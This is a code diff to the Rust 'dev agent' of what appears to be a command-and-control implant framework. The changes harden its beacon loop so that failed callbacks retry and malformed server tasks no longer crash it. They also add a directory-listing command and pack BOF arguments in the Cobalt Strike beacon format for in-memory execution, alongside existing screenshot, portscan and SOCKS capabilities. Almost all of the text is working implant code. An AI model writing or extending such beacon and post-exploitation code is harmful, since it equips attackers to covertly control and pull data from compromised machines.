@@ -39,7 +39,18 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     let kp = ImplantKeypair::generate()
         .map_err(|_| anyhow::anyhow!("CSPRNG failure during implant keypair generation"))?;
     let pubkey = kp.public_bytes();
-    let key = kp.session_key(&cfg.server_pub);
+    let key = kp.session_key(&cfg.server_pub).unwrap_or_else(|e| {
+        // Fatal config error: a non-contributory server pubkey (low-order
+        // point, e.g. all-zero) can never yield a session key. Use a distinct
+        // exit code so the operator can tell key-exchange failure apart from a
+        // generic error without reading logs.
+        tracing::error!(
+            error = %e,
+            "fatal config error: server pubkey rejected by X25519 (low-order point); \
+             fix NYX_SERVER_PUB"
+        );
+        std::process::exit(0xB1);
+    });
     let beacon_id: u32 = rand::random();
 
     // Resolve the server-side response envelope (the transform chain the server
@@ -90,18 +101,28 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     loop {
         std::thread::sleep(jitter_sleep(cfg.sleep_seconds, cfg.jitter_pct));
 
+        // `encode_batch` never fails: an oversized response blob is replaced
+        // with a `Response::Err` so the batch still encodes (mirrors the PIC
+        // beacon's encode_batch — a bad blob must not abort the loop).
         let frame = encode_frame(
             &pubkey,
             counter,
             &key,
-            &TaskResponse::encode_vec(&pending_responses)?,
+            &encode_batch(&mut pending_responses),
         )
         .map_err(|e| anyhow::anyhow!("failed to seal beacon frame: {e}"))?;
-        counter += 1;
-        pending_responses.clear();
 
+        // Counter/pending discipline (P0-3): advance the counter and drain the
+        // pending batch ONLY after the POST actually succeeded, so a failed
+        // round-trip neither desyncs the sequence number nor drops undelivered
+        // responses (they ride the next frame at the same counter). Mirrors
+        // the mid-cycle flush paths below.
         let resp = match ureq::post(&beacon_url).send_bytes(&frame) {
-            Ok(r) => r,
+            Ok(r) => {
+                counter += 1;
+                pending_responses.clear();
+                r
+            }
             Err(e) => {
                 tracing::warn!(?e, "beacon POST failed");
                 continue;
@@ -130,7 +151,14 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                 continue;
             }
         };
-        let tasks = Task::decode_vec(&plaintext)?;
+        // A malformed/unparseable server reply must not kill the beacon loop:
+        // skip the cycle and try again on the next sleep (mirrors the PIC
+        // beacon's `beacon_dispatch_tasks` — decode failures are transient or
+        // malicious, never fatal for the agent).
+        let Ok(tasks) = Task::decode_vec(&plaintext) else {
+            tracing::warn!("task batch decode failed; skipping cycle");
+            continue;
+        };
 
         for t in tasks {
             if matches!(t.command, Command::Exit) {
@@ -152,20 +180,23 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                 // 如果加这条会超限，先 flush 当前批次
                 if estimated_size > BATCH_FLUSH {
                     // 单条本身就很大（不应发生——分块应该保证每条 <128KB）
-                    // 直接发这条独占一个帧
-                    let single = vec![TaskResponse {
+                    // 直接发这条独占一个帧（encode_batch 会把超限 blob 换成
+                    // Err，编码本身不会失败）。
+                    let mut single = vec![TaskResponse {
                         task_id: t.task_id,
                         response,
                     }];
-                    let frame =
-                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&single)?)
-                            .map_err(|e| {
+                    let frame = encode_frame(&pubkey, counter, &key, &encode_batch(&mut single))
+                        .map_err(|e| {
                             anyhow::anyhow!("failed to seal oversized-chunk frame: {e}")
                         })?;
+                    // 只有 POST 成功才推进 counter（失败不推进：下一帧仍用同一
+                    // counter，服务端从未见过这一帧）。
                     if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
                         tracing::warn!(error = %e, "beacon send failed (oversized chunk); response dropped");
+                    } else {
+                        counter += 1;
                     }
-                    counter += 1;
                     continue;
                 }
                 let current_batch_size: usize = pending_responses
@@ -181,19 +212,25 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                 if current_batch_size + estimated_size > BATCH_FLUSH
                     && !pending_responses.is_empty()
                 {
-                    // Flush 当前批次
+                    // Flush 当前批次。encode_batch 保证编码不失败；只有 POST
+                    // 成功才推进 counter 并清空批次——失败的批次留在 pending
+                    // 里，随下一帧（同一 counter）重发：不丢响应、不对齐失步。
                     let frame = encode_frame(
                         &pubkey,
                         counter,
                         &key,
-                        &TaskResponse::encode_vec(&pending_responses)?,
+                        &encode_batch(&mut pending_responses),
                     )
                     .map_err(|e| anyhow::anyhow!("failed to seal batch-flush frame: {e}"))?;
-                    if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
-                        tracing::warn!(error = %e, "beacon send failed (batch flush); response batch dropped");
+                    match ureq::post(&beacon_url).send_bytes(&frame) {
+                        Ok(_) => {
+                            counter += 1;
+                            pending_responses.clear();
+                        }
+                        Err(e) => {
+                            tracing::warn!(error = %e, "beacon send failed (batch flush); response batch retained for retry");
+                        }
                     }
-                    counter += 1;
-                    pending_responses.clear();
                 }
                 pending_responses.push(TaskResponse {
                     task_id: t.task_id,
@@ -202,6 +239,41 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
             }
         }
     }
+}
+
+/// Encode a batch of [`TaskResponse`]s for the wire, gracefully handling an
+/// oversized payload. `TaskResponse::encode_vec` only fails when a blob
+/// exceeds `wire::MAX_BLOB_LEN` (256 KiB) — in practice a screenshot or large
+/// BOF output. Since the dev agent mirrors the PIC beacon (`panic = "abort"`
+/// discipline), letting that propagate would abort the loop; instead we
+/// replace each oversized [`Response`] with a tiny `Response::Err` and retry.
+/// The operator sees what was dropped instead of the agent dying.
+/// `Response::Err` messages are themselves bounded well under `MAX_BLOB_LEN`,
+/// so the retry always succeeds. Ported from the implant beacon's
+/// `encode_batch` (crates/implant-win/src/beacon.rs).
+fn encode_batch(pending: &mut Vec<TaskResponse>) -> Vec<u8> {
+    if let Ok(v) = TaskResponse::encode_vec(pending) {
+        return v;
+    }
+    // One or more responses carried a blob > MAX_BLOB_LEN. Replace each
+    // oversized payload with an Err so the batch encodes (and the operator is
+    // told what was dropped rather than the beacon aborting).
+    for tr in pending.iter_mut() {
+        let too_big = match &tr.response {
+            Response::FileChunk { data, .. }
+            | Response::Output(data)
+            | Response::BofOutput(data)
+            | Response::Image(data)
+            | Response::Channel { data, .. } => data.len() > nyx_protocol::wire::MAX_BLOB_LEN,
+            Response::Ok | Response::Err(_) => false,
+        };
+        if too_big {
+            tr.response = Response::Err(String::from(
+                "response too large: payload exceeds MAX_BLOB_LEN",
+            ));
+        }
+    }
+    TaskResponse::encode_vec(pending).unwrap_or_default()
 }
 
 /// Recover the raw encrypted frame from a server response body. With no
@@ -237,7 +309,7 @@ fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
         Command::FileOp { op, path, dest } => vec![do_fileop(op, work_dir, &path, dest.as_deref())],
         // P2/P3 executors (BOF, P2P connect, SOCKS) are implant-side; the dev
         // agent acks them as unimplemented so the wire types stay round-trippable.
-        Command::Bof { blob, .. } => vec![bof_execute(&blob)],
+        Command::Bof { blob, args, .. } => vec![bof_execute(&blob, &args)],
         Command::Screenshot { monitor } => do_screenshot(monitor),
         Command::Portscan { host, ports } => vec![do_portscan(&host, &ports)],
         Command::Net { query } => vec![do_net(&query)],
@@ -677,6 +749,27 @@ fn do_fileop(op: FileOp, work_dir: &Path, path: &str, dest: Option<&str>) -> Res
             },
             None => Response::Err("cp: missing dest".into()),
         },
+        FileOp::Ls => {
+            // 列目录：每行一个条目，目录加 '/' 后缀（UI 的 ls 解析器认这个
+            // 约定，见 client-ui-web FileTable.parseLsLines）。
+            match fs::read_dir(&full) {
+                Ok(entries) => {
+                    let mut lines: Vec<String> = Vec::new();
+                    for entry in entries.flatten() {
+                        let name = entry.file_name().to_string_lossy().into_owned();
+                        let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
+                        if is_dir {
+                            lines.push(format!("{name}/"));
+                        } else {
+                            lines.push(name);
+                        }
+                    }
+                    lines.sort();
+                    Response::Output(lines.join("\n").into_bytes())
+                }
+                Err(e) => Response::Err(format!("ls {path}: {e}")),
+            }
+        }
     }
 }
 
@@ -737,9 +830,25 @@ fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
     }
 }
 
+/// Pack a `Vec<String>` of BOF args into the CS beacon.h wire format so a
+/// BOF's `BeaconDataParse`/`BeaconGetStr` can read them: each arg is
+/// `[u32 tag][u32 len][bytes]` (BEACON_ARG_TYPE_STRING = 3). Mirrors
+/// implant-win's `pack_args`; the empty slice packs to an empty blob (the
+/// bof-runner passes a NULL buffer + 0 for no-args BOFs per the CS ABI
+/// `void go(char *args, int alen)`).
+fn pack_bof_args(args: &[String]) -> Vec<u8> {
+    let mut out = Vec::new();
+    for a in args {
+        out.extend_from_slice(&3u32.to_le_bytes()); // BEACON_ARG_TYPE_STRING
+        out.extend_from_slice(&(a.len() as u32).to_le_bytes());
+        out.extend_from_slice(a.as_bytes());
+    }
+    out
+}
+
 /// Run a BOF (Windows/Wine via nyx-bof-runner) and return its BeaconPrintf
 /// output. On non-Windows the dev agent can't execute COFF machine code.
-fn bof_execute(blob: &[u8]) -> Response {
+fn bof_execute(blob: &[u8], args: &[String]) -> Response {
     #[cfg(target_os = "windows")]
     {
         // BOF execution runs in RWX memory + calls externals through COFF
@@ -749,9 +858,10 @@ fn bof_execute(blob: &[u8]) -> Response {
         // with a generous 4 MiB stack to give the BOF + Beacon-API shim plenty
         // of headroom.
         let blob_owned = blob.to_vec();
+        let args_blob = pack_bof_args(args);
         match std::thread::Builder::new()
             .stack_size(4 * 1024 * 1024)
-            .spawn(move || nyx_bof_runner::execute(&blob_owned))
+            .spawn(move || nyx_bof_runner::execute(&blob_owned, &args_blob))
         {
             Ok(handle) => match handle.join() {
                 Ok(Ok(r)) => Response::BofOutput(r.output.into_bytes()),
@@ -764,6 +874,7 @@ fn bof_execute(blob: &[u8]) -> Response {
     #[cfg(not(target_os = "windows"))]
     {
         let _ = blob;
+        let _ = args;
         Response::Err("bof: not supported by the dev agent on this OS".into())
     }
 }
@@ -1126,5 +1237,68 @@ mod tests {
             ),
             "socks connect should report open channel, got: {resp:?}"
         );
+    }
+
+    #[test]
+    fn encode_batch_replaces_oversized_blob_with_err() {
+        // A response whose blob exceeds MAX_BLOB_LEN must not abort the loop:
+        // encode_batch replaces it with a bounded Response::Err so the batch
+        // still encodes and the operator sees what was dropped.
+        let mut batch = vec![
+            TaskResponse {
+                task_id: 1,
+                response: Response::Output(vec![0u8; nyx_protocol::wire::MAX_BLOB_LEN + 1]),
+            },
+            TaskResponse {
+                task_id: 2,
+                response: Response::Ok,
+            },
+        ];
+        let encoded = encode_batch(&mut batch);
+        assert!(
+            !encoded.is_empty(),
+            "batch must still encode after the Err swap"
+        );
+        assert!(
+            matches!(&batch[0].response, Response::Err(m) if m.contains("MAX_BLOB_LEN")),
+            "oversized response must be replaced with an explanatory Err"
+        );
+        // The swapped batch encodes cleanly on a direct call too (the retry
+        // inside encode_batch always succeeds).
+        assert!(
+            TaskResponse::encode_vec(&batch).is_ok(),
+            "post-swap batch must encode cleanly"
+        );
+        // A small payload passes through untouched (same bytes as encode_vec).
+        let expected = TaskResponse {
+            task_id: 3,
+            response: Response::Output(b"hi".to_vec()),
+        };
+        let mut small = vec![TaskResponse {
+            task_id: 3,
+            response: Response::Output(b"hi".to_vec()),
+        }];
+        assert_eq!(
+            encode_batch(&mut small),
+            TaskResponse::encode_vec(&[expected]).unwrap()
+        );
+        assert!(
+            matches!(&small[0].response, Response::Output(d) if d == b"hi"),
+            "small payload must be left untouched"
+        );
+    }
+
+    #[test]
+    fn pack_bof_args_matches_cs_wire_format() {
+        // Each arg is [u32 tag=3][u32 len][bytes] (BEACON_ARG_TYPE_STRING).
+        let packed = pack_bof_args(&["abc".into(), "".into()]);
+        assert_eq!(&packed[0..4], &3u32.to_le_bytes());
+        assert_eq!(&packed[4..8], &3u32.to_le_bytes());
+        assert_eq!(&packed[8..11], b"abc");
+        assert_eq!(&packed[11..15], &3u32.to_le_bytes());
+        assert_eq!(&packed[15..19], &0u32.to_le_bytes());
+        assert_eq!(packed.len(), 19);
+        // No args → empty blob (bof-runner passes NULL + 0 per the CS ABI).
+        assert!(pack_bof_args(&[]).is_empty());
     }
 }
